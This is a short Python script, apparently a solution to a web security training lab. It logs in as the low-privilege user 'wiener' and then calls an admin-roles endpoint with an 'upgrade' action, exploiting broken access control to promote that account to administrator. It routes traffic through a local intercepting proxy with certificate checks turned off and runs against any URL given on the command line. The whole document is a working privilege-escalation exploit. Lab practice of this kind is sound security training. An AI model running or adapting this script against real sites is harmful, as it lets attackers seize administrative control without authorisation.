import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def promote_user_toadmin(session, url):
    # Login as the regular user
    login_user_url = url + "/login"
    params = {'username': 'wiener', 'password': 'peter'}
    res = session.post(login_user_url, data=params, verify=False, proxies=proxies)
    if "Log out" in res.text:
        print("(+) Successfully logged in as the wiener user.")

        # Exploit access control vulnerabilites to promote the user to admin
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        res = session.get(admin_roles_url, verify=False, proxies=proxies)
        if "Admin panel" in res.text:
            print("(+) Successfully promoted the user to administrator.")
        else:
            print("(-) Could not promote the user to administrator.")
            sys.exit(-1)

    else:
        print("(-) Could not login as the wiener user.")
        print("(-) Existing the script...")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} <url>")
        print(f"(+) Example: python {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    promote_user_toadmin(session, url)

if __name__ == "__main__":
    main()